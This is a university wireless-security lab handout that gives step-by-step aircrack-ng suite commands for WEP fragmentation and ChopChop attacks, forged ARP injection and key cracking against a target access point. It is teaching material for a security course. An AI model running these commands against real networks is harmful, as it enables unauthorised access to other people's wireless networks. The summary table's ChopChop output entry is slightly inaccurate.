
## Module Code: 6CSEF005W  
**Module name:** Wireless Network Security  
**Lab activity:** Advanced WEP Attacks – Fragmentation & ChopChop  
**Author:** Dr Ayman El Hajjar  

---

#  Lab Activity: Advanced WEP Key Recovery Techniques

---

###  Objective

This lab builds on basic WEP cracking techniques by introducing **Fragmentation** and **ChopChop** attacks. These allow attackers to recover useful keystreams **without needing a connected client** and to inject traffic into a WEP network.

---

##  Requirements

- Wireless card in monitor mode (`wlan0mon`)
- Target AP running WEP
- Tools: `aircrack-ng`, `aireplay-ng`, `packetforge-ng`, `airodump-ng`

---

##
 Background

| Attack          | Purpose                                  |
|------------------|------------------------------------------|
| **Fragmentation**| Recovers small keystream from broadcast packets |
| **ChopChop**     | Decrypts packets byte-by-byte via guesswork |
| **Forged ARP**   | Injects known plaintext to generate traffic |

---

##  Step-by-Step Instructions

### 1. Monitor the AP

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```

> Identify: BSSID, channel, no. of data packets

---

### 2. Fake Authentication (if needed)

```bash
sudo aireplay-ng -1 0 -a <BSSID> -h <ATTACKER_MAC> wlan0mon
```

---

### 3. Fragmentation Attack

```bash
sudo aireplay-ng --fragment -b <BSSID> -h <ATTACKER_MAC> wlan0mon
```

- Saves a `.xor` file if successful
- Use this for packet crafting

---

### 4. Create a Forged ARP Packet

```bash
sudo packetforge-ng -0 -a <BSSID> -h <ATTACKER_MAC> -k 255.255.255.255 -l 192.168.1.100 -y fragment.xor -w arp-request
```

---

### 5. Inject the Forged Packet

```bash
sudo aireplay-ng -2 -r arp-request wlan0mon
```

---

### 6. ChopChop Attack (Alternative)

```bash
sudo aireplay-ng --chopchop -b <BSSID> -h <ATTACKER_MAC> wlan0mon
```

- Slower but can work when fragment fails

---

### 7. Crack the WEP Key

```bash
sudo aircrack-ng capture.cap
```

> Use `.cap` file generated during replay or injection

---

##  Optional Screenshots

Store in `tasks/img/`:
- Fragmentation `.xor` output
- PacketForge command
- aircrack-ng cracking session

---

##
 Discussion Questions

- What makes these attacks work without a connected client?
- Why is known plaintext so valuable to attackers?
- How do these techniques compare to ARP replay?

---

## Summary


| Attack        | Tool             | Output           | Use Case                         |
|---------------|------------------|------------------|----------------------------------|
| Fragmentation | `aireplay-ng`    | `.xor` file      | Recover keystream                |
| Packet Forge  | `packetforge-ng` | forged packet    | Used for injection               |
| ChopChop      | `aireplay-ng`    | slow IV build-up | Byte-by-byte packet decryption   |
| Crack Key     | `aircrack-ng`    | WEP key          | Final key recovery               |

---
